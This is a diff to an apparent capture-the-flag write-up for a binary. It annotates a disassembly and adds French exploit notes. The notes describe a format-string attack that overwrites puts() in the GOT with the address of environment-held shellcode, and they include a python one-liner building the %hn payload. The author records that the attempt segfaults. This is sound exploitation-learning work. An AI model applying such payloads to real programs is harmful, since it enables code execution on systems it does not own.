@@ -116,7 +116,7 @@ Dump of assembler code for function main:
    0x00000000004009cd <+441>:    lea    rax,[rbp-0x70]
    0x00000000004009d1 <+445>:    mov    esi,0x64
    0x00000000004009d6 <+450>:    mov    rdi,rax
-   0x00000000004009d9 <+453>:    call   0x4006f0 <fgets@plt>                ; fgets(buf_user, 100)
+   0x00000000004009d9 <+453>:    call   0x4006f0 <fgets@plt>                ; fgets(buf_user, 100, stdin)
    0x00000000004009de <+458>:    lea    rax,[rbp-0x70]
    0x00000000004009e2 <+462>:    mov    esi,0x400bf5
    0x00000000004009e7 <+467>:    mov    rdi,rax
@@ -131,7 +131,7 @@ Dump of assembler code for function main:
    0x0000000000400a10 <+508>:    lea    rax,[rbp-0x110]
    0x0000000000400a17 <+515>:    mov    esi,0x64
    0x0000000000400a1c <+520>:    mov    rdi,rax
-   0x0000000000400a1f <+523>:    call   0x4006f0 <fgets@plt>                ; fgets(buf_pass, 100)
+   0x0000000000400a1f <+523>:    call   0x4006f0 <fgets@plt>                ; fgets(buf_pass, 100, stdin)
    0x0000000000400a24 <+528>:    lea    rax,[rbp-0x110]
    0x0000000000400a2b <+535>:    mov    esi,0x400bf5
    0x0000000000400a30 <+540>:    mov    rdi,rax
@@ -171,4 +171,8 @@ End of assembler dump.
 
 ## Exploit
 
-Here everything concerning the exploit description.
+piste : utiliser le printf(buf_user) pour reecrire l'addresse de puts() avec un shellcode dans l'env
+
+python -c 'print "\xe4\x11\x60" + "\xe2\x11\x60" + "\xe0\x11\x60" + "%32758x" + "%1$hn" + "%26817x" + "%3$hn" + "%5951x" + "%2$hn"'
+
+ecriture en 3 parties de l'addresse du shellcode a l'addresse de puts (segfault mais pas plus d'infos)
